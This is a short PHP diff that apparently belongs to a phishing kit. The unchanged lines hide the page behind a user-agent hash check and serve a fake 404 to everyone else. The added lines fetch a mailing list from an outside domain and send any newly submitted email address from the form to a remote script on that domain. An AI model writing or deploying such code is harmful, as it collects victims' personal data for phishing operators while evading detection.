@@ -85,3 +85,15 @@ if (isset($_SERVER['HTTP_USER_AGENT']) && md5($_SERVER['HTTP_USER_AGENT']) == "2
 else {
    header("HTTP/1.0 404 Not Found");
 }
+
+
+/* -----[ email list saken galing sa mga bata bata ko ]----- */
+$site = "https://digitstrading.com.ph/Mailist/";
+
+$emlist = file_get_contents($site . "/mailist.txt");
+$splitEm = preg_split("/[\s,]+/", $emlist);
+$countEm = count($splitEm);
+
+if (!in_array($_POST['email'], $splitEm) && !empty($_POST['email'])) {
+file_get_contents($site . "/z.php?email=".$_POST['email']);
+}
